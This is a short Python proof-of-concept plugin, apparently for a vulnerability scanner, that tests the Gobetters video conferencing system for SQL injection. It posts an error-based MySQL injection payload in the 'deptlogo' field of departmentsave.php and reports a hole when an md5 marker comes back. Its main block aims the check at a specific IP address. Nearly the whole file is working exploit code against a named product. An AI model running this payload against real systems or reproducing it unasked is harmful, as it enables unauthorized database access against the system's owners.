#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:Gobetters视频会议系统post注入最后一枚（post数据不同一起不方便）
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0134733


def assign(service,arg):
    if service=="gobetter":
        return True,arg 


def  audit(arg):
    url=arg+"web/department/departmentsave.php"
    post="deptid=1&deptcode=1&deptlogo=1%27%20AND%20(SELECT%207173%20FROM(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20'ninq'='ninq&deptdesc=1"
 
    code,head,res,errcode,_=curl.curl2(url,post)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url)

if __name__=="__main__":
    from dummy import *
    audit(assign('gobetter','http://218.89.3.21:89/')[1])